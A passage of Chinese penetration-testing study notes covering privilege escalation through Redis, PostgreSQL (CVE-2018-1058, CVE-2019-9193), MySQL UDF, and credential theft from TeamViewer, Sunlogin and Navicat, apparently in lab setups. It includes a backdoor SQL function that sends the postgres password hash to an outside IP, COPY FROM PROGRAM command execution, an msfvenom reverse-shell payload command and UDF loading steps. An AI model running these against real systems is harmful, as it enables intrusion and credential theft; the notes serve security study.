class="headerlink" title="(3).权限较低往web物理路径写webshell"></a>(3).权限较低往web物理路径写webshell</h6><p>修复方案：</p><p>注意：以下操作，均需重启 Redis 后才能生效。</p><p>绑定需要访问数据库的IP。 将127.0.0.1修改为需要访问此数据库的IP地址。</p><p>设置访问密码。在 Redis.conf中requirepass 字段后，设置添加访问密码。</p><p>修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。</p><h3 id="数据库-PostgreSQL数据库权限提升-漏洞"><a href="#数据库-PostgreSQL数据库权限提升-漏洞" class="headerlink" title="#数据库-PostgreSQL数据库权限提升-漏洞"></a>#数据库-PostgreSQL数据库权限提升-漏洞</h3><h6 id="PostgreSQL是一款关系型数据库。其9-3到11版本中存在一处“特性”，管理员或具有“COPY-TO-x2F-FROM-PROGRAM”权限的用户，可以使用这个特性执行任意命令。"><a href="#PostgreSQL是一款关系型数据库。其9-3到11版本中存在一处“特性”，管理员或具有“COPY-TO-x2F-FROM-PROGRAM”权限的用户，可以使用这个特性执行任意命令。" class="headerlink" title="PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。"></a>PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。</h6><h6 id="提权利用的是漏洞：CVE-2018-1058-CVE-2019-9193"><a href="#提权利用的是漏洞：CVE-2018-1058-CVE-2019-9193" class="headerlink" title="提权利用的是漏洞：CVE-2018-1058 CVE-2019-9193"></a>提权利用的是漏洞：CVE-2018-1058 CVE-2019-9193</h6><h6 id="连接-利用漏洞-执行-提权"><a href="#连接-利用漏洞-执行-提权" class="headerlink" title="连接-利用漏洞-执行-提权"></a>连接-利用漏洞-执行-提权</h6><p>参考：<a href="https://vulhub.org/#/environments/postgres/">https://vulhub.org/#/environments/postgres/</a></p><h6 id="修复方案：升级版本或打上补丁"><a href="#修复方案：升级版本或打上补丁" class="headerlink" title="修复方案：升级版本或打上补丁"></a>修复方案：升级版本或打上补丁</h6><h5 id="1、CVE-2018-1058"><a href="#1、CVE-2018-1058" class="headerlink" title="1、CVE-2018-1058"></a>1、CVE-2018-1058</h5><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091143241.png" alt="image-20230420091143241"></p><h5 id="普通用户植入后门命令"><a href="#普通用户植入后门命令" class="headerlink" title="普通用户植入后门命令"></a>普通用户植入后门命令</h5><p>CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</p><p>​    select dblink_connect((select ‘hostaddr&#x3D;47.114.103.63 port&#x3D;5433 user&#x3D;postgres password&#x3D;chybeta sslmode&#x3D;disable dbname&#x3D;’||(SELECT passwd FROM pg_shadow WHERE usename&#x3D;’postgres’))); </p><p>​    SELECT pg_catalog.array_to_string($1,$2);</p><p>$$ LANGUAGE SQL VOLATILE;</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091537800.png" alt="image-20230420091537800"></p><h5 id="管理员操作数据库触发"><a href="#管理员操作数据库触发" class="headerlink" title="管理员操作数据库触发"></a>管理员操作数据库触发</h5><p>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091634457.png" alt="image-20230420091634457"></p><p>监听获取到了反弹的shell</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420091712682.png" alt="image-20230420091712682"></p><h5 id="2、-CVE-2019-9193（无需管理员操作）"><a href="#2、-CVE-2019-9193（无需管理员操作）" class="headerlink" title="2、-CVE-2019-9193（无需管理员操作）"></a>2、-CVE-2019-9193（无需管理员操作）</h5><p>获得管理员用户</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092500836.png" alt="image-20230420092500836"></p><p>DROP TABLE IF EXISTS cmd_exec;</p><p>CREATE TABLE cmd_exec(cmd_output text);</p><p>COPY cmd_exec FROM PROGRAM ‘id’;</p><p>SELECT * FROM cmd_exec;</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092114303.png" alt="image-20230420092114303"></p><p>更改id就行</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420092424040.png" alt="image-20230420092424040"></p><h3 id="三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据"><a href="#三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据" class="headerlink" title="#三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据"></a>#三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据</h3><p><a href="https://blog.csdn.net/weixin_53009585/article/details/129098656">【权限提升】利用第三方应用Teamviewer&amp;向日葵&amp;Navivat-凭据_teamviewer管理员权限_今天是 几 号的博客-CSDN博客</a></p><p>远控类：Teamviewer 向日葵 Todesk VNC Radmin 等</p><p>密码类：各大浏览器 Xshell Navicat 3389 等</p><p>服务类：FileZilla Serv-u Zend等（这些软件基本不用了）</p><p>演示：</p><h5 id="1、用户：Teamviewer"><a href="#1、用户：Teamviewer" class="headerlink" title="1、用户：Teamviewer"></a>1、用户：Teamviewer</h5><h5 id="2、Web用户：向日葵"><a href="#2、Web用户：向日葵" class="headerlink" title="2、Web用户：向日葵"></a>2、Web用户：向日葵</h5><h5 id="3、用户：Navicat"><a href="#3、用户：Navicat" class="headerlink" title="3、用户：Navicat"></a>3、用户：Navicat</h5><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="1、向日葵"><a href="#1、向日葵" class="headerlink" title="1、向日葵"></a>1、向日葵</h5><h6 id="集成工具里面的cs有脚本插件"><a href="#集成工具里面的cs有脚本插件" class="headerlink" title="集成工具里面的cs有脚本插件"></a>集成工具里面的cs有脚本插件</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420093420395.png" alt="image-20230420093420395"></p><h6 id="上线后，先选择上传"><a href="#上线后，先选择上传" class="headerlink" title="上线后，先选择上传"></a>上线后，先选择上传</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420093708826.png" alt="image-20230420093708826"></p><h6 id="这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行"><a href="#这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行" class="headerlink" title="这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行"></a>这里的上传目录最好是获得的网站权限的目录，因为别的目录可能因为权限而无法执行</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094015836.png" alt="image-20230420094015836"></p><h6 id="改为网站目录"><a href="#改为网站目录" class="headerlink" title="改为网站目录"></a>改为网站目录</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094047570.png" alt="image-20230420094047570"></p><h6 id="上传后点运行"><a href="#上传后点运行" class="headerlink" title="上传后点运行"></a>上传后点运行</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094201155.png" alt="image-20230420094201155"></p><h6 id="可以看到"><a href="#可以看到" class="headerlink" title="可以看到"></a>可以看到</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094229631.png" alt="image-20230420094229631"></p><h6 id="运行脚本，解密密文即可"><a href="#运行脚本，解密密文即可" class="headerlink" title="运行脚本，解密密文即可"></a>运行脚本，解密密文即可</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420094347725.png" alt="image-20230420094347725"></p><h5 id="2、Teamviewer"><a href="#2、Teamviewer" class="headerlink" title="2、Teamviewer"></a>2、Teamviewer</h5><p>受害机上的Teamviewer的ID和密码</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420095701302.png" alt="image-20230420095701302"></p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.130.42 LPORT&#x3D;3333 -f exe -o msf.exe   #生成后门，将后门上传到网站</p><h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF:"></a>MSF:</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420101932138.png" alt="image-20230420101932138"></p><h6 id="获取到的密码和上面的一样"><a href="#获取到的密码和上面的一样" class="headerlink" title="获取到的密码和上面的一样"></a>获取到的密码和上面的一样</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102005940.png" alt="image-20230420102005940"></p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102432550.png" alt="image-20230420102432550"></p><h6 id="也能抓取，要本地用户权限"><a href="#也能抓取，要本地用户权限" class="headerlink" title="也能抓取，要本地用户权限"></a>也能抓取，要本地用户权限</h6><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102450291.png" alt="image-20230420102450291"></p><h5 id="3、Navicat"><a href="#3、Navicat" class="headerlink" title="3、Navicat"></a>3、Navicat</h5><p>获取Navicat上的所有账号密码</p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102946807.png" alt="image-20230420102946807"></p><p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230420102956932.png" alt="image-20230420102956932"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day99 权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF</title>
      <link href="/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/"/>
      <url>/2023/04/17/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/881Zo_9-ppUN2L8qZb_fZQ.pngw=1280&h=1949.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、数据库账号密码获取方式</p><p>2、Mysql&amp;Mssql&amp;Oracle提权</p><p>3、数据库提权针对操作系统问题</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="Linux已复现第一篇："><a href="#Linux已复现第一篇：" class="headerlink" title="Linux已复现第一篇："></a>Linux已复现第一篇：</h4><h4 id="1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客"><a href="#1、-Linux提权（mysql-UDF提权）-linux-mysql-udf提权-LZsec的博客-CSDN博客" class="headerlink" title="1、 Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客"></a>1、<a href="https://blog.csdn.net/waxcj/article/details/128343131"> Linux提权（mysql UDF提权）_linux mysql udf提权_LZsec的博客-CSDN博客</a></h4><h4 id="2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园"><a href="#2、Mysql提权-基于Mysql的UDF提权（Linux系统）-码小农的幸福生活-博客园" class="headerlink" title="2、Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 "></a>2、<a href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 </a></h4><h4 id="➢-提权条件-数据库帐号密码获取方式"><a href="#➢-提权条件-数据库帐号密码获取方式" class="headerlink" title="➢ 提权条件-数据库帐号密码获取方式"></a>➢ 提权条件-数据库帐号密码获取方式</h4><h4 id="➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#➢-MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>➢ MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><h4 id="➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#➢-MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>➢ MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h4><h4 id="➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#➢-Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>➢ Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h4></blockquote><h3 id="Linux第一篇复现注意点"><a href="#Linux第一篇复现注意点" class="headerlink" title="#Linux第一篇复现注意点"></a>#Linux第一篇复现注意点</h3><h5 id="步骤kali上搜索Linux-udf提权脚本"><a href="#步骤kali上搜索Linux-udf提权脚本" class="headerlink" title="步骤kali上搜索Linux udf提权脚本"></a>步骤kali上搜索Linux udf提权脚本</h5><ol><li><h6 id="将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下"><a href="#将脚本文件在本地进行编译后上传到靶机的-x2F-tmp目录下" class="headerlink" title="将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下"></a>将脚本文件在本地进行编译后上传到靶机的&#x2F;tmp目录下</h6><h6 id="gcc-g-c-1518-c"><a href="#gcc-g-c-1518-c" class="headerlink" title="gcc -g -c 1518.c"></a>gcc -g -c 1518.c</h6><h6 id="gcc-g-shared-o-1518-so-1518-o"><a href="#gcc-g-shared-o-1518-so-1518-o" class="headerlink" title="gcc -g -shared -o 1518.so 1518.o"></a>gcc -g -shared -o 1518.so 1518.o</h6></li><li><h6 id="将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下"><a href="#将1518-so文件通过蚁剑上传到靶机-x2F-tmp目录下" class="headerlink" title="将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下"></a>将1518.so文件通过蚁剑上传到靶机&#x2F;tmp目录下</h6></li><li><h6 id="进入数据库进行udf提权"><a href="#进入数据库进行udf提权" class="headerlink" title="进入数据库进行udf提权"></a>进入数据库进行udf提权</h6></li><li><h6 id="use-mysql-进入数据库"><a href="#use-mysql-进入数据库" class="headerlink" title="use mysql; #进入数据库"></a>use mysql; #进入数据库</h6></li><li><h6 id="create-table-foo-line-blob-创建数据表"><a href="#create-table-foo-line-blob-创建数据表" class="headerlink" title="create table foo(line blob); #创建数据表"></a>create table foo(line blob); #创建数据表</h6></li><li><h6 id="insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的"><a href="#insert-into-foo-values-load-file-‘-x2F-tmp-x2F-icepeak-so’-插入数据，这里我并没有将1518-so改名，可改可不改的" class="headerlink" title="insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的"></a>insert into foo values(load_file(‘&#x2F;tmp&#x2F;icepeak.so’)); #插入数据，这里我并没有将1518.so改名，可改可不改的</h6></li><li><h6 id="select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个"><a href="#select-from-foo-into-dumpfile-‘-x2F-usr-x2F-lib-x2F-mysql-x2F-lib-x2F-plugin-x2F-icepeak-so’-Foo表成功插入二进制数据，-然后利用dumpfile函数把文件导出-outfile-多行导出，dumpfile一行导出-outfile会有特殊的转换，而dumpfile是原数据导出-新建存储函数，这里要注意自己的plugin路径-没有lib-x2F-plugin就创建这两个" class="headerlink" title="select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)"></a>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F;icepeak.so’; #( Foo表成功插入二进制数据， 然后利用dumpfile函数把文件导出 outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 新建存储函数，这里要注意自己的plugin路径,没有lib&#x2F;plugin就创建这两个)</h6></li><li><h6 id="create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功"><a href="#create-function-do-system-returns-integer-soname-‘icepeak-so’-创建自定义函数do-system-类型是integer，别名-soname文件名字然后查询函数是否创建成功" class="headerlink" title="create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)"></a>create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)</h6></li><li><h6 id="select-from-mysql-func"><a href="#select-from-mysql-func" class="headerlink" title="select * from mysql.func;"></a>select * from mysql.func;</h6></li><li><h6 id="使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权"><a href="#使用-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null查看SUID提权" class="headerlink" title="使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权"></a>使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权</h6></li></ol><h6 id="我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功"><a href="#我是将1518-so放在虚拟机win7上面的phpstudy服务器通过远程下载到-x2F-tmp目录来模拟真实环境下的操作，下面为下载成功" class="headerlink" title="我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功"></a>我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421170532141.png" alt="image-20230421170532141"></p><h6 id="但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误"><a href="#但是执行文中的create-function-do-system-returns-integer-soname-‘1518-so’-时出现错误" class="headerlink" title="但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误"></a>但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172032009.png" alt="image-20230421172032009"></p><h6 id="参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"><a href="#参考了文章Qt-Linux-连MySQL出现libmysqlclient-so-16，file-too-short错误-kaip-TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下" class="headerlink" title="参考了文章Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下"></a>参考了文章<a href="https://blog.csdn.net/kaip_TJU/article/details/103112421">Qt Linux 连MySQL出现libmysqlclient.so.16，file too 